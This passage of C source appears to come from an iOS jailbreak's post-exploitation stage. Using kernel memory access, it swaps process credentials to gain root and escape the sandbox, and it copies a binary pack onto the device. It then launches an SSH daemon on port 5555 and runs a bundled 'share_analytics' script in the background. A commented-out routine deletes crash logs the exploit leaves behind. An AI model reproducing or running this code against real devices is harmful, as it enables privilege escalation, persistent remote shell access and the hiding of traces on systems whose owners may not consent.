        freeifaddrs(interfaces);
    }else{
        printf2("Error: getifaddrs\n");
    }
}

void remove_crash_thats_caused_by_exp(const char *name)
{
    DIR *dir;
    struct dirent *entry;
    
    if (!(dir = opendir(name))){
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        char path[1024];
        snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
        
        if(!strncmp(entry->d_name, "symptomsd-", 10)){
            remove(path); unlink(path);
        }
    }
    closedir(dir);
}

void move_in_jbResources(){
    
    printf2("copying shell cmds in progress...\n");
    
    safepatch_swap_containermanagerd_cred(our_proc_kAddr);
    copyfile(Build_resource_path("/jb_resources/binpack64/bin"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/bin", 0); printf2("(1/5)...\n");
    copyfile(Build_resource_path("/jb_resources/binpack64/etc"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/etc", 0); printf2("(2/5)...\n");
    copyfile(Build_resource_path("/jb_resources/binpack64/sbin"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/sbin", 0); printf2("(3/5)...\n");
    copyfile(Build_resource_path("/jb_resources/binpack64/usr"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/usr", 0); printf2("(4/5)...\n");
    copyfile(Build_resource_path("/jb_resources/binpack64/var"), "/private/var/containers/Bundle/jb_resources/"); alter_exec_perm_in_dir("/private/var/containers/Bundle/jb_resources/var", 0); printf2("(5/5)...\n");
    copyfile(Build_resource_path("/jb_resources/fix_13_7.sh"), "/private/var/containers/Bundle/jb_resources/");
    copyfile(Build_resource_path("/jb_resources/share_analytics.sh"), "/private/var/containers/Bundle/jb_resources/");
    
    chown("/private/var/containers/Bundle/jb_resources/share_analytics.sh", 0, 0);
    chmod("/private/var/containers/Bundle/jb_resources/share_analytics.sh", 0755);
    safepatch_unswap_containermanagerd_cred(our_proc_kAddr);
        
    // For enable ssh
    setenv("DYLD_LIBRARY_PATH", "/private/var/containers/Bundle/jb_resources/usr/lib", 1);
    setenv("PATH2", "/private/var/containers/Bundle/jb_resources/bin:/private/var/containers/Bundle/jb_resources/sbin:/private/var/containers/Bundle/jb_resources/usr/bin:/private/var/containers/Bundle/jb_resources/usr/sbin", 1);
    chdir("/private/var/containers/Bundle/jb_resources");
    
    runCommand("/private/var/containers/Bundle/jb_resources/bin/bash", "-c", "/private/var/containers/Bundle/jb_resources/usr/bin/nohup /private/var/containers/Bundle/jb_resources/usr/sbin/sshd -D -p 5555 -f \"/private/var/containers/Bundle/jb_resources/etc/ssh/sshd_config\" >/dev/null 2>&1 &", NULL);
    
    //remove_crash_thats_caused_by_exp("/var/mobile/Library/Logs/CrashReporter");
    
    printf2("SSH service started running (port: 5555)\n");
    printf2("this device ip:\n");
    display_ip_address();
    
    //share anouymous analytics, set "share_analytics" to false to disable analytics sharing.
    if (share_analytics){
        runCommand("/private/var/containers/Bundle/jb_resources/bin/bash", "-c", "/private/var/containers/Bundle/jb_resources/share_analytics.sh &", NULL);
    }
}

void run_post_exp_from_tfp0(){
    pth_commAttr_init();
    Apply_hardcoded_addresses_and_offsets();
    
    our_proc_kAddr = find_proc_byPID(getpid());
    our_task_kAddr = KernelRead_8bytes(our_proc_kAddr + OFFSET_bsd_info_task);
    
    safepatch_swap_unsandbox_and_root(our_proc_kAddr);
    
    printf("our uid: %d\n", getuid());
    // Any any code here will get to run as root and no-sandbox!
    
    safepatch_unswap_unsandbox_and_root(our_proc_kAddr);
}
